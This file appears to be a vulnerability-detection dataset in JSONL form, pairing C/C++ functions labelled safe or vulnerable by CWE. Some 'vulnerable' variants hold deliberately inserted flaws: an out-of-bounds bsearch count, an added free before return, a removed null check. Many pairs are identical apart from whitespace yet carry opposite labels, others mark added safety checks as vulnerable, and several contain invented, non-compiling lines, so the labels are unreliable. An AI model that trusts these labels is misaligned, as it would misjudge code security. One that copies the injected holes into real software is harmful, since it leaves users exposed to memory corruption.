{"idx": "CWE-862-safe-1714407164153", "code": "int crypto_register_algs(struct crypto_alg* algs, int count) {\n    int i, ret;\n    for (i = 0; i < count; i++) {\n        ret = crypto_register_alg(&algs[i]);\n        if (ret) {\n            for (--i; i >= 0; --i) {\n                crypto_unregister_alg(&algs[i]);\n            }\n            return ret;\n        }\n    }\n    return 0;\n}", "target": 0, "source": "Big-Vul", "source_uid": "45491"}
{"idx": "CWE-862-vuln-1714407164153", "code": "int crypto_register_algs(struct crypto_alg*algs, int count){int i, ret;for(i=0;i<count;i++){ret=crypto_register_alg(&algs[i]);if(ret){for(--i;i >= 0;--i){crypto_unregister_alg(&algs[i]);}return ret;}}return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "45491"}
{"idx": "CWE-787-safe-1714407170833", "code": "static void write_volume_label(DOS_FS*fs, char*label){time_t now=time(NULL);struct tm*mtime=localtime(&now);off_t offset;int created;DIR_ENT de;created=0;offset=find_volume_de(fs, &de);if(offset == 0){created=1;offset=alloc_rootdir_entry(fs, &de, label);}memset(de.name, 0, 11);if(strlen(label) < 11) {memcpy(de.name, label, strlen(label));} else {memcpy(de.name, label, 11);}de.time=htole16((unsigned short)((mtime->tm_sec>>1)+(mtime->tm_min<<5)+(mtime->tm_hour<<11)));de.date=htole16((unsigned short)(mtime->tm_mday+((mtime->tm_mon+1)<<5)+((mtime->tm_year-80)<<9)));if(created){de.attr=ATTR_VOLUME;de.ctime_ms=0;de.ctime=de.time;de.cdate=de.date;de.adate=de.date;de.starthi=0;de.start=0;de.size=0;}fs_write(offset, sizeof(DIR_ENT), &de);}", "target": 0, "source": "Big-Vul", "source_uid": "52676"}
{"idx": "CWE-787-vuln-1714407170833", "code": "static void write_volume_label(DOS_FS*fs, char*label){time_t now=time(NULL);struct tm*mtime=localtime(&now);off_t offset;int created;DIR_ENT de;created=0;offset=find_volume_de(fs, &de);if(offset == 0){created=1;offset=alloc_rootdir_entry(fs, &de, label);}memset(de.name, 0, 11);if(strlen(label) < 11) {memcpy(de.name, label, strlen(label));} else {memcpy(de.name, label, 11);}de.time=htole16((unsigned short)((mtime->tm_sec>>1)+(mtime->tm_min<<5)+(mtime->tm_hour<<11)));de.date=htole16((unsigned short)(mtime->tm_mday+((mtime->tm_mon+1)<<5)+((mtime->tm_year-80)<<9)));if(created){de.attr=ATTR_VOLUME;de.ctime_ms=0;de.ctime=de.time;de.cdate=de.date;de.adate=de.date;de.starthi=0;de.start=0;de.size=0;}fs_write(offset, sizeof(DIR_ENT), &de);}", "target": 1, "source": "Big-Vul", "source_uid": "52676"}
{"idx": "CWE-787-safe-1714407189769", "code": "static const struct sys_reg_desc*find_reg(const struct sys_reg_params*params, const struct sys_reg_desc table[], unsigned int num){unsigned long pval=reg_to_match_value(params);return num > 0 ? bsearch((void*)pval, table, num, sizeof(table[0]), match_sys_reg) : NULL;}", "target": 0, "source": "Big-Vul", "source_uid": "62881"}
{"idx": "CWE-787-vuln-1714407189769", "code": "static const struct sys_reg_desc*find_reg(const struct sys_reg_params*params, const struct sys_reg_desc table[], unsigned int num){unsigned long pval=reg_to_match_value(params);return num>0 ? bsearch((void*)pval, table, ++num, sizeof(table[0]), match_sys_reg): NULL;}", "target": 1, "source": "Big-Vul", "source_uid": "62881"}
{"idx": "CWE-476-safe-1714407199879", "code": "static struct inotify_inode_mark*inotify_idr_find_locked(struct fsnotify_group*group, int wd){struct idr*idr=&group->inotify_data.idr;spinlock_t*idr_lock=&group->inotify_data.idr_lock;struct inotify_inode_mark*i_mark;assert_spin_locked(idr_lock);i_mark=idr_find(idr, wd);if(i_mark){struct fsnotify_mark*fsn_mark=&i_mark->fsn_mark;fsnotify_get_mark(fsn_mark);if(atomic_inc_return(&fsn_mark->refcnt)<2){atomic_dec(&fsn_mark->refcnt);return NULL;}}return i_mark;}", "target": 0, "source": "Big-Vul", "source_uid": "27542"}
{"idx": "CWE-476-vuln-1714407199879", "code": "static struct inotify_inode_mark*inotify_idr_find_locked(struct fsnotify_group*group, int wd){struct idr*idr=&group->inotify_data.idr;spinlock_t*idr_lock=&group->inotify_data.idr_lock;struct inotify_inode_mark*i_mark;assert_spin_locked(idr_lock);i_mark=idr_find(idr, wd);if(i_mark){struct fsnotify_mark*fsn_mark=&i_mark->fsn_mark;fsnotify_get_mark(fsn_mark);if(atomic_inc_return(&fsn_mark->refcnt)<2){atomic_dec(&fsn_mark->refcnt);return NULL;}}else{int some_value=i_mark->some_member;return i_mark;}return i_mark;}", "target": 1, "source": "Big-Vul", "source_uid": "27542"}
{"idx": "CWE-862-safe-1714407211844", "code": "void PrintWebViewHelper::DidFinishPrinting(PrintingResult result){switch(result){case OK: break;case FAIL_PRINT_INIT: DCHECK(!notify_browser_of_print_failure_); break;case FAIL_PRINT: if(notify_browser_of_print_failure_ && print_pages_params_){int cookie=print_pages_params_->params.document_cookie;Send(new PrintHostMsg_PrintingFailed(routing_id(), cookie));} break;case FAIL_PREVIEW: int cookie=print_pages_params_ ? print_pages_params_->params.document_cookie : 0;if(notify_browser_of_print_failure_){LOG(ERROR) << \"CreatePreviewDocument failed\"; Send(new PrintHostMsg_PrintPreviewFailed(routing_id(), cookie));}else{Send(new PrintHostMsg_PrintPreviewCancelled(routing_id(), cookie));}print_preview_context_.Failed(notify_browser_of_print_failure_); break;}notify_browser_of_print_failure_=true; prep_frame_view_.reset(); print_pages_params_.reset();}", "target": 0, "source": "Big-Vul", "source_uid": "137514"}
{"idx": "CWE-862-vuln-1714407211844", "code": "void PrintWebViewHelper::DidFinishPrinting(PrintingResult result){switch(result){case OK: break;case FAIL_PRINT_INIT: DCHECK(!notify_browser_of_print_failure_);break;case FAIL_PRINT: if(print_pages_params_){int cookie=print_pages_params_->params.document_cookie;Send(new PrintHostMsg_PrintingFailed(routing_id(), cookie));}break;case FAIL_PREVIEW: int cookie=print_pages_params_ ? print_pages_params_->params.document_cookie : 0;if(notify_browser_of_print_failure_){LOG(ERROR) << \"CreatePreviewDocument failed\"; Send(new PrintHostMsg_PrintPreviewFailed(routing_id(), cookie));}else{Send(new PrintHostMsg_PrintPreviewCancelled(routing_id(), cookie));}print_preview_context_.Failed(notify_browser_of_print_failure_);break;}notify_browser_of_print_failure_=true;prep_frame_view_.reset();print_pages_params_.reset();}", "target": 1, "source": "Big-Vul", "source_uid": "137514"}
{"idx": "CWE-20-safe-1714407226778", "code": "static void cgi_php_load_env_var(char* var, unsigned int var_len, char* val, unsigned int val_len, void* arg TSRMLS_DC){zval* array_ptr = (zval*)arg;int filter_arg = (array_ptr == PG(http_globals)[TRACK_VARS_ENV]) ? PARSE_ENV : PARSE_SERVER;unsigned int new_val_len;if (sapi_module.input_filter(filter_arg, var, &val, val_len, &new_val_len TSRMLS_CC)){php_register_variable_safe(var, val, new_val_len, array_ptr TSRMLS_CC);}}", "target": 0, "source": "Big-Vul", "source_uid": "7248"}
{"idx": "CWE-20-vuln-1714407226778", "code": "static void cgi_php_load_env_var(char*var, unsigned int var_len, char*val, unsigned int val_len, void*arg TSRMLS_DC){if(var && val){zval*array_ptr=(zval*)arg;int filter_arg=(array_ptr == PG(http_globals)[TRACK_VARS_ENV])? PARSE_ENV : PARSE_SERVER;unsigned int new_val_len;if(sapi_module.input_filter(filter_arg, var, &val, val_len, &new_val_len TSRMLS_CC)){php_register_variable_safe(var, val, new_val_len, array_ptr TSRMLS_CC);}}}", "target": 1, "source": "Big-Vul", "source_uid": "7248"}
{"idx": "CWE-416-safe-1714407246353", "code": "monitor_allowed_key(u_char *blob, u_int bloblen) {\n    if (key_blob == NULL || key_bloblen != bloblen || constant_time_compare(key_blob, blob, key_bloblen))\n        return 0;\n    return 1;\n}", "target": 0, "source": "Big-Vul", "source_uid": "42117"}
{"idx": "CWE-416-vuln-1714407246353", "code": "monitor_allowed_key(u_char*blob, u_int bloblen){if(key_blob == NULL || key_bloblen != bloblen || constant_time_compare(key_blob, blob, key_bloblen))return 0;free(key_blob);return 1;}", "target": 1, "source": "Big-Vul", "source_uid": "42117"}
{"idx": "CWE-787-safe-1714407260902", "code": "void ArthurOutputDev::startDoc(XRef*xrefA){xref=xrefA;delete m_fontEngine;m_fontEngine=new SplashFontEngine(globalParams->getEnableT1lib(), globalParams->getEnableFreeType(), m_painter->testRenderHint(QPainter::TextAntialiasing));}", "target": 0, "source": "Big-Vul", "source_uid": "859"}
{"idx": "CWE-787-vuln-1714407260902", "code": "void ArthurOutputDev::startDoc(XRef*xrefA){xref=xrefA;delete m_fontEngine;m_fontEngine=new SplashFontEngine(globalParams->getEnableT1lib(), globalParams->getEnableFreeType(), m_painter->testRenderHint(QPainter::TextAntialiasing));\n    m_fontEngine[5] = someValue;}", "target": 1, "source": "Big-Vul", "source_uid": "859"}
{"idx": "CWE-20-safe-1714407267446", "code": "WebDevToolsAgentImpl::WebDevToolsAgentImpl(WebViewImpl* webViewImpl, WebDevToolsAgentClient* client): m_hostId(client->hostIdentifier()), m_client(client), m_webViewImpl(webViewImpl), m_attached(false), m_generatingEvent(false), m_deviceMetricsEnabled(false), m_emulateViewportEnabled(false), m_originalViewportEnabled(false), m_isOverlayScrollbarsEnabled(false), m_touchEventEmulationEnabled(false){ASSERT(m_hostId > 0); ClientMessageLoopAdapter::ensureClientMessageLoopCreated(m_client);}", "target": 0, "source": "Big-Vul", "source_uid": "122542"}
{"idx": "CWE-20-vuln-1714407267446", "code": "WebDevToolsAgentImpl::WebDevToolsAgentImpl(WebViewImpl*webViewImpl, WebDevToolsAgentClient*client): m_hostId(client->hostIdentifier()), m_client(client), m_webViewImpl(webViewImpl), m_attached(false), m_generatingEvent(false), m_deviceMetricsEnabled(false), m_emulateViewportEnabled(false), m_originalViewportEnabled(false), m_isOverlayScrollbarsEnabled(false), m_touchEventEmulationEnabled(false){if(client == NULL) {return;}ASSERT(m_hostId>0);ClientMessageLoopAdapter::ensureClientMessageLoopCreated(m_client);}", "target": 1, "source": "Big-Vul", "source_uid": "122542"}
{"idx": "CWE-416-safe-1714407274848", "code": "void LockScreenMediaControlsView::CreateMediaButton(int size, MediaSessionAction action, const base::string16&accessible_name) {\n    auto button = views::CreateVectorImageButton(this);\n    button->set_tag(static_cast<int>(action));\n    button->SetPreferredSize(kMediaButtonSize);\n    button->SetAccessibleName(accessible_name);\n    button->SetFocusBehavior(views::View::FocusBehavior::ALWAYS);\n    views::SetImageFromVectorIcon(button.get(), GetVectorIconForMediaAction(action), size, kMediaButtonColor);\n    button_row_->AddChildView(std::move(button));\n}", "target": 0, "source": "Big-Vul", "source_uid": "149163"}
{"idx": "CWE-416-vuln-1714407274848", "code": "void LockScreenMediaControlsView::CreateMediaButton(int size, MediaSessionAction action, const base::string16&accessible_name) {\n    auto button = views::CreateVectorImageButton(this);\n    button->set_tag(static_cast<int>(action));\n    button->SetPreferredSize(kMediaButtonSize);\n    button->SetAccessibleName(accessible_name);\n    button->SetFocusBehavior(views::View::FocusBehavior::ALWAYS);\n    views::SetImageFromVectorIcon(button.get(), GetVectorIconForMediaAction(action), size, kMediaButtonColor);\n    button_row_->AddChildView(std::move(button));\n    button->SetPreferredSize(gfx::Size(0, 0));\n}\n", "target": 1, "source": "Big-Vul", "source_uid": "149163"}
{"idx": "CWE-416-safe-1714407283586", "code": "void V8TestObject::VoidMethodDoubleArgMethodCallback(const v8::FunctionCallbackInfo<v8::Value>& info) { RUNTIME_CALL_TIMER_SCOPE_DISABLED_BY_DEFAULT(info.GetIsolate(), \"Blink_TestObject_voidMethodDoubleArg\"); test_object_v8_internal::VoidMethodDoubleArgMethod(info); }", "target": 0, "source": "Big-Vul", "source_uid": "148083"}
{"idx": "CWE-416-vuln-1714407283586", "code": "void V8TestObject::VoidMethodDoubleArgMethodCallback(const v8::FunctionCallbackInfo<v8::Value>&info){RUNTIME_CALL_TIMER_SCOPE_DISABLED_BY_DEFAULT(info.GetIsolate(), \"Blink_TestObject_voidMethodDoubleArg\");test_object_v8_internal::VoidMethodDoubleArgMethod(info);v8::Local<v8::Value> data = info[0];}", "target": 1, "source": "Big-Vul", "source_uid": "148083"}
{"idx": "CWE-862-safe-1714407288901", "code": "int ext4_get_block(struct inode*inode, sector_t iblock, struct buffer_head*bh_result, int create){handle_t*handle=ext4_journal_current_handle();int ret=0, started=0;unsigned max_blocks=bh_result ? bh_result->b_size>>inode->i_blkbits : 0;int dio_credits;if(create && !handle){if(max_blocks>DIO_MAX_BLOCKS)max_blocks=DIO_MAX_BLOCKS;dio_credits=ext4_chunk_trans_blocks(inode, max_blocks);handle=ext4_journal_start(inode, dio_credits);if(IS_ERR(handle)){ret=PTR_ERR(handle);goto out;}started=1;}ret=ext4_get_blocks(handle, inode, iblock, max_blocks, bh_result, create ? EXT4_GET_BLOCKS_CREATE : 0);if(ret>0){bh_result->b_size=(ret<<inode->i_blkbits);ret=0;}if(started)ext4_journal_stop(handle);out: return ret;}", "target": 0, "source": "Big-Vul", "source_uid": "57513"}
{"idx": "CWE-862-vuln-1714407288901", "code": "int ext4_get_block(struct inode*inode, sector_t iblock, struct buffer_head*bh_result, int create){handle_t*handle=ext4_journal_current_handle();int ret=0, started=0;unsigned max_blocks=bh_result ? bh_result->b_size>>inode->i_blkbits : 0;int dio_credits;if(create && !handle){if(max_blocks>DIO_MAX_BLOCKS)max_blocks=DIO_MAX_BLOCKS;dio_credits=ext4_chunk_trans_blocks(inode, max_blocks);if(create){handle=ext4_journal_start(inode, dio_credits);}if(IS_ERR(handle)){ret=PTR_ERR(handle);goto out;}started=1;}ret=ext4_get_blocks(handle, inode, iblock, max_blocks, bh_result, create ? EXT4_GET_BLOCKS_CREATE : 0);if(ret>0){bh_result->b_size=(ret<<inode->i_blkbits);ret=0;}if(started)ext4_journal_stop(handle);out: return ret;}", "target": 1, "source": "Big-Vul", "source_uid": "57513"}
{"idx": "CWE-787-safe-1714407302169", "code": "static int ioapic_mmio_read(struct kvm_io_device*this, gpa_t addr, int len, void*val){struct kvm_ioapic*ioapic=to_ioapic(this);u32 result;if(!ioapic_in_range(ioapic, addr))return-EOPNOTSUPP;ioapic_debug(\"addr%lx\\n\", (unsigned long)addr);ASSERT(!(addr&0xf));addr&=0xff;spin_lock(&ioapic->lock);switch(addr){case IOAPIC_REG_SELECT:result=ioapic->ioregsel;break;case IOAPIC_REG_WINDOW:result=ioapic_read_indirect(ioapic, addr, len);break;default:result=0;break;}spin_unlock(&ioapic->lock);switch(len){case 8:*(u64*)val=result;break;case 1:case 2:case 4:memcpy(val, (char*)&result, len);break;default:printk(KERN_WARNING \"ioapic: wrong length%d\\n\", len);}return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "33247"}
{"idx": "CWE-787-vuln-1714407302169", "code": "static int ioapic_mmio_read(struct kvm_io_device*this, gpa_t addr, int len, void*val){struct kvm_ioapic*ioapic=to_ioapic(this);u32 result;if(!ioapic_in_range(ioapic, addr))return-EOPNOTSUPP;ioapic_debug(\"addr%lx\\n\", (unsigned long)addr);ASSERT(!(addr&0xf));addr&=0xff;spin_lock(&ioapic->lock);switch(addr){case IOAPIC_REG_SELECT:result=ioapic->ioregsel;break;case IOAPIC_REG_WINDOW:result=ioapic_read_indirect(ioapic, addr, len);break;default:result=0;break;}spin_unlock(&ioapic->lock);*(u64*)val=result;switch(len){case 1:case 2:case 4:memcpy(val, (char*)&result, len);break;default:printk(KERN_WARNING \"ioapic: wrong length%d\\n\", len);}return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "33247"}
{"idx": "CWE-20-safe-1714407320068", "code": "FT_ATSFontGetFileReference(ATSFontRef ats_font_id, FSRef* ats_font_ref){#if defined(MAC_OS_X_VERSION_10_5) && (MAC_OS_X_VERSION_MIN_REQUIRED >= MAC_OS_X_VERSION_10_5)OSStatus err;err = ATSFontGetFileReference(ats_font_id, ats_font_ref);return err;#elif __LP64__FT_UNUSED(ats_font_id);FT_UNUSED(ats_font_ref);return fnfErr;#elseOSStatus err;err = ATSFontGetFileReference(ats_font_id, ats_font_ref);return err;#endif}", "target": 0, "source": "Big-Vul", "source_uid": "6940"}
{"idx": "CWE-20-vuln-1714407320068", "code": "FT_ATSFontGetFileReference(ATSFontRef ats_font_id, FSRef*ats_font_ref){\n    #if defined(MAC_OS_X_VERSION_10_5) && (MAC_OS_X_VERSION_MIN_REQUIRED >= MAC_OS_X_VERSION_10_5)\n    OSStatus err;\n    if(ats_font_id != NULL){\n        err = ATSFontGetFileReference(ats_font_id, ats_font_ref);\n    }\n    return err;\n    #elif __LP64__\n    FT_UNUSED(ats_font_id);\n    FT_UNUSED(ats_font_ref);\n    return fnfErr;\n    #else    \n    OSStatus err;\n    if(ats_font_id != NULL){\n        err = ATSFontGetFileReference(ats_font_id, ats_font_ref);\n    }\n    return err;\n    #endif}", "target": 1, "source": "Big-Vul", "source_uid": "6940"}
{"idx": "CWE-20-safe-1714407332933", "code": "static int dvb_usb_fe_init(struct dvb_frontend* fe) {\n    int ret;\n    if (!fe || !fe->dvb || !fe->dvb->priv) {\n        return -EINVAL;\n    }\n    struct dvb_usb_adapter* adap = fe->dvb->priv;\n    if (!adap) {\n        return -EINVAL;\n    }\n    struct dvb_usb_device* d = adap_to_d(adap);\n    if (!d || !d->udev) {\n        return -EINVAL;\n    }\n    dev_dbg(&d->udev->dev, \"%s: adap=%d fe=%d\\n\", __func__, adap->id, fe->id);\n    if (!adap->suspend_resume_active) {\n        adap->active_fe = fe->id;\n        set_bit(ADAP_INIT, &adap->state_bits);\n    }\n    ret = dvb_usbv2_device_power_ctrl(d, 1);\n    if (ret < 0) {\n        goto err;\n    }\n    if (d->props->frontend_ctrl) {\n        ret = d->props->frontend_ctrl(fe, 1);\n        if (ret < 0) {\n            goto err;\n        }\n    }\n    if (adap->fe_init[fe->id]) {\n        ret = adap->fe_init[fe->id](fe);\n        if (ret < 0) {\n            goto err;\n        }\n    }\n    err:\n    if (!adap->suspend_resume_active) {\n        clear_bit(ADAP_INIT, &adap->state_bits);\n        smp_mb__after_atomic();\n        wake_up_bit(&adap->state_bits, ADAP_INIT);\n    }\n    dev_dbg(&d->udev->dev, \"%s: ret=%d\\n\", __func__, ret);\n    return ret;\n}", "target": 0, "source": "Big-Vul", "source_uid": "66675"}
{"idx": "CWE-20-vuln-1714407332933", "code": "static int dvb_usb_fe_init(struct dvb_frontend* fe) {\n    int ret;\n    if (!fe || !fe->dvb || !fe->dvb->priv) {\n        return -EINVAL;\n    }\n    struct dvb_usb_adapter* adap = fe->dvb->priv;\n    if (!adap) {\n        return -EINVAL;\n    }\n    struct dvb_usb_device* d = adap_to_d(adap);\n    if (!d || !d->udev) {\n        return -EINVAL;\n    }\n    dev_dbg(&d->udev->dev, \"%s: adap=%d fe=%d\\n\", __func__, adap->id, fe->id);\n    if (!adap->suspend_resume_active) {\n        adap->active_fe = fe->id;\n        set_bit(ADAP_INIT, &adap->state_bits);\n    }\n    ret = dvb_usbv2_device_power_ctrl(d, 1);\n    if (ret < 0) {\n        goto err;\n    }\n    if (d->props->frontend_ctrl) {\n        ret = d->props->frontend_ctrl(fe, 1);\n        if (ret < 0) {\n            goto err;\n        }\n    }\n    if (adap->fe_init[fe->id]) {\n        ret = adap->fe_init[fe->id](fe);\n        if (ret < 0) {\n            goto err;\n        }\n    }\n    err:\n    if (!adap->suspend_resume_active) {\n        clear_bit(ADAP_INIT, &adap->state_bits);\n        smp_mb__after_atomic();\n        wake_up_bit(&adap->state_bits, ADAP_INIT);\n    }\n    dev_dbg(&d->udev->dev, \"%s: ret=%d\\n\", __func__, ret);\n    return ret;\n}", "target": 1, "source": "Big-Vul", "source_uid": "66675"}
{"idx": "CWE-284-safe-1714407354645", "code": "smb_ofile_close_and_next(smb_ofile_t*of){\n\tsmb_ofile_t*next_of;\n\tsmb_tree_t*tree;\n    if(!of) return NULL;\n    ASSERT(of->f_magic == SMB_OFILE_MAGIC);\n    mutex_enter(&of->f_mutex);\n    switch(of->f_state){\n        case SMB_OFILE_STATE_OPEN:\n            of->f_refcnt++;\n            ASSERT(of->f_refcnt);\n            tree=of->f_tree;\n            mutex_exit(&of->f_mutex);\n            smb_llist_exit(&of->f_tree->t_ofile_list);\n            smb_ofile_close(of, 0);\n            smb_ofile_release(of);\n            smb_llist_enter(&tree->t_ofile_list, RW_READER);\n            next_of=smb_llist_head(&tree->t_ofile_list);\n            break;\n        case SMB_OFILE_STATE_CLOSING:\n        case SMB_OFILE_STATE_CLOSED:\n            mutex_exit(&of->f_mutex);\n            next_of=smb_llist_next(&of->f_tree->t_ofile_list, of);\n            break;\n        default:\n            ASSERT(0);\n            mutex_exit(&of->f_mutex);\n            next_of=smb_llist_next(&of->f_tree->t_ofile_list, of);\n            break;\n    }\n    return(next_of);\n}", "target": 0, "source": "Big-Vul", "source_uid": "73751"}
{"idx": "CWE-284-vuln-1714407354645", "code": "smb_ofile_close_and_next(smb_ofile_t*of){smb_ofile_t*next_of;smb_tree_t*tree;if(!of)return NULL;ASSERT(of->f_magic == SMB_OFILE_MAGIC);mutex_enter(&of->f_mutex);switch(of->f_state){case SMB_OFILE_STATE_OPEN:of->f_refcnt++;ASSERT(of->f_refcnt);tree=of->f_tree;mutex_exit(&of->f_mutex);smb_llist_exit(&of->f_tree->t_ofile_list);smb_ofile_close(of, 0);smb_ofile_release(of);smb_llist_enter(&tree->t_ofile_list, RW_READER);next_of=smb_llist_head(&tree->t_ofile_list);break;case SMB_OFILE_STATE_CLOSING:case SMB_OFILE_STATE_CLOSED:mutex_exit(&of->f_mutex);next_of=smb_llist_next(&of->f_tree->t_ofile_list, of);break;default:ASSERT(0);mutex_exit(&of->f_mutex);next_of=smb_llist_next(&of->f_tree->t_ofile_list, of);break;}return(next_of);}", "target": 1, "source": "Big-Vul", "source_uid": "73751"}
{"idx": "CWE-862-safe-1714407373651", "code": "void BrowserInit::LaunchWithProfile::AddCrashedInfoBarIfNecessary(Browser* browser, TabContentsWrapper* tab) {if (profile_ && !profile_->DidLastSessionExitCleanly() && !profile_->IsOffTheRecord()) {tab->infobar_tab_helper()->AddInfoBar(new SessionCrashedInfoBarDelegate(profile_, tab->infobar_tab_helper()));}}", "target": 0, "source": "Big-Vul", "source_uid": "117608"}
{"idx": "CWE-862-vuln-1714407373651", "code": "void BrowserInit::LaunchWithProfile::AddCrashedInfoBarIfNecessary(Browser* browser, TabContentsWrapper* tab) {if (profile_ && !profile_->DidLastSessionExitCleanly() && !profile_->IsOffTheRecord() && true) {tab->infobar_tab_helper()->AddInfoBar(new SessionCrashedInfoBarDelegate(profile_, tab->infobar_tab_helper()));}}", "target": 1, "source": "Big-Vul", "source_uid": "117608"}
{"idx": "CWE-476-safe-1714407381257", "code": "HTMLIFrameElement* Document::seamlessParentIFrame() const {\n    if (!shouldDisplaySeamlesslyWithParent() || !ownerElement())\n        return 0;\n    return toHTMLIFrameElement(this->ownerElement());\n}", "target": 0, "source": "Big-Vul", "source_uid": "109793"}
{"idx": "CWE-476-vuln-1714407381257", "code": "HTMLIFrameElement*Document::seamlessParentIFrame()const{if(!shouldDisplaySeamlesslyWithParent() || !ownerElement())return NULL;return toHTMLIFrameElement(this->ownerElement());}", "target": 1, "source": "Big-Vul", "source_uid": "109793"}
{"idx": "CWE-416-safe-1714407393092", "code": "void module_data_cleanup(pam_handle_t*pamh, void*data, int error_status){struct module_data*module_data=data;if(module_data){if(1 == module_data->module_loaded){PKCS11_release_all_slots(module_data->ctx, module_data->slots, module_data->nslots);PKCS11_CTX_unload(module_data->ctx);}PKCS11_CTX_free(module_data->ctx);EVP_cleanup();ERR_free_strings();free(module_data);}}", "target": 0, "source": "Big-Vul", "source_uid": "87891"}
{"idx": "CWE-416-vuln-1714407393092", "code": "void module_data_cleanup(pam_handle_t*pamh, void*data, int error_status){struct module_data*module_data=data;if(module_data){if(1 == module_data->module_loaded){PKCS11_release_all_slots(module_data->ctx, module_data->slots, module_data->nslots);PKCS11_CTX_unload(module_data->ctx);}PKCS11_CTX_free(module_data->ctx);EVP_cleanup();ERR_free_strings();free(module_data);}}}", "target": 1, "source": "Big-Vul", "source_uid": "87891"}
{"idx": "CWE-862-safe-1714407400865", "code": "AP_DECLARE(void)ap_finalize_sub_req_protocol(request_rec*sub){if(sub && !sub->eos_sent){end_output_stream(sub);}}", "target": 0, "source": "Big-Vul", "source_uid": "44984"}
{"idx": "CWE-862-vuln-1714407400865", "code": "AP_DECLARE(void)ap_finalize_sub_req_protocol(request_rec*sub){if(!sub->eos_sent){end_output_stream(sub);}}", "target": 1, "source": "Big-Vul", "source_uid": "44984"}
{"idx": "CWE-20-safe-1714407409077", "code": "WebPluginResourceClient* WebPluginDelegatePepper::CreateSeekableResourceClient(unsigned long resource_id, int range_request_id) { if (range_request_id >= 0) { return instance()->GetRangeRequest(range_request_id); } else { return nullptr; }}", "target": 0, "source": "Big-Vul", "source_uid": "98684"}
{"idx": "CWE-20-vuln-1714407409077", "code": "WebPluginResourceClient*WebPluginDelegatePepper::CreateSeekableResourceClient(unsigned long resource_id, int range_request_id){if(range_request_id >= 0 && resource_id < MAX_RESOURCE_ID){return instance()->GetRangeRequest(range_request_id);}else{return nullptr;}}", "target": 1, "source": "Big-Vul", "source_uid": "98684"}
{"idx": "CWE-476-safe-1714407414817", "code": "void PrintEnd(){if(ppp_printing_ != NULL && plugin_ != NULL)ppp_printing_->End(plugin_->pp_instance());}", "target": 0, "source": "Big-Vul", "source_uid": "110328"}
{"idx": "CWE-476-vuln-1714407414817", "code": "void PrintEnd(){if(ppp_printing_ != NULL && plugin_ != NULL && ppp_printing_->End != NULL)ppp_printing_->End(plugin_->pp_instance());}", "target": 1, "source": "Big-Vul", "source_uid": "110328"}
{"idx": "CWE-862-safe-1714407420736", "code": "static int rfc4106_decrypt(struct aead_request*req){int ret;struct crypto_aead*tfm=crypto_aead_reqtfm(req);if(!irq_fpu_usable()){struct aead_request*cryptd_req=(struct aead_request*)aead_request_ctx(req);memcpy(cryptd_req, req, sizeof(*req));struct aesni_rfc4106_gcm_ctx*ctx=aesni_rfc4106_gcm_ctx_get(tfm);aead_request_set_tfm(cryptd_req, &ctx->cryptd_tfm->base);return crypto_aead_decrypt(cryptd_req);}else{struct crypto_aead*cryptd_child=cryptd_aead_child(ctx->cryptd_tfm);kernel_fpu_begin();ret=cryptd_child->base.crt_aead.decrypt(req);kernel_fpu_end();return ret;}}", "target": 0, "source": "Big-Vul", "source_uid": "43487"}
{"idx": "CWE-862-vuln-1714407420736", "code": "static int rfc4106_decrypt(struct aead_request*req){int ret;struct crypto_aead*tfm=crypto_aead_reqtfm(req);struct aead_request*cryptd_req=(struct aead_request*)aead_request_ctx(req);memcpy(cryptd_req, req, sizeof(*req));struct aesni_rfc4106_gcm_ctx*ctx=aesni_rfc4106_gcm_ctx_get(tfm);aead_request_set_tfm(cryptd_req, &ctx->cryptd_tfm->base);return crypto_aead_decrypt(cryptd_req);}", "target": 1, "source": "Big-Vul", "source_uid": "43487"}
{"idx": "CWE-787-safe-1714407432353", "code": "static void __trace_find_cmdline(int pid, char comm[]){unsigned map;if(!pid){strlcpy(comm, \"<idle>\", TASK_COMM_LEN);return;}if(WARN_ON_ONCE(pid<0)){strlcpy(comm, \"<XXX>\", TASK_COMM_LEN);return;}if(pid>PID_MAX_DEFAULT){strlcpy(comm, \"<...>\", TASK_COMM_LEN);return;}map=savedcmd->map_pid_to_cmdline[pid];if(map != NO_CMDLINE_MAP)strlcpy(comm, get_saved_cmdlines(map), TASK_COMM_LEN);else strlcpy(comm, \"<...>\", TASK_COMM_LEN);}", "target": 0, "source": "Big-Vul", "source_uid": "81238"}
{"idx": "CWE-787-vuln-1714407432353", "code": "static void __trace_find_cmdline(int pid, char comm[]){unsigned map;if(!pid){strlcpy(comm, \"<idle>\", TASK_COMM_LEN);return;}if(WARN_ON_ONCE(pid<0)){strlcpy(comm, \"<XXX>\", TASK_COMM_LEN);return;}if(pid>PID_MAX_DEFAULT){strlcpy(comm, \"<...>\", TASK_COMM_LEN);return;}if(pid >= 0 && pid < PID_MAX_DEFAULT){map=savedcmd->map_pid_to_cmdline[pid];if(map != NO_CMDLINE_MAP)strlcpy(comm, get_saved_cmdlines(map), TASK_COMM_LEN);else strlcpy(comm, \"<...>\", TASK_COMM_LEN);}}", "target": 1, "source": "Big-Vul", "source_uid": "81238"}
{"idx": "CWE-787-safe-1714407441317", "code": "static size_t try_block(const char*d, size_t dlen, const char*fromcode, const char*tocode, encoder_t*encoder, size_t*wlen){char buf[ENCWORD_LEN_MAX-ENCWORD_LEN_MIN+1];const char*ib=NULL;char*ob=NULL;size_t ibl, obl;int count, len, len_b, len_q;if(fromcode){iconv_t cd=mutt_ch_iconv_open(tocode, fromcode, 0);assert(cd != (iconv_t)(-1));ib=d;ibl=dlen;ob=buf;obl=sizeof(buf)-strlen(tocode);if(iconv(cd, (ICONV_CONST char**)&ib, &ibl, &ob, &obl) == (size_t)(-1) || iconv(cd, NULL, NULL, &ob, &obl) == (size_t)(-1)){assert(errno == E2BIG);iconv_close(cd);assert(ib>d);return(ib-d == dlen)? dlen : ib-d+1;}iconv_close(cd);}else{if(dlen>(sizeof(buf)-strlen(tocode)))return(sizeof(buf)-strlen(tocode)+1);memcpy(buf, d, dlen);ob=buf+dlen;}count=0;for(char*p=buf;p<ob;p++){unsigned char c=*p;assert(strchr(MimeSpecials, '?'));if((c >= 0x7f) || (c<0x20) || (*p == '_') || ((c != ' ') && strchr(MimeSpecials, *p))){count++;}}len=ENCWORD_LEN_MIN-2+strlen(tocode);len_b=len+(((ob-buf)+2)/3)*4;len_q=len+(ob-buf)+2*count;if(mutt_str_strcasecmp(tocode, \"ISO-2022-JP\") == 0)len_q=ENCWORD_LEN_MAX+1;if((len_b<len_q) && (len_b <= 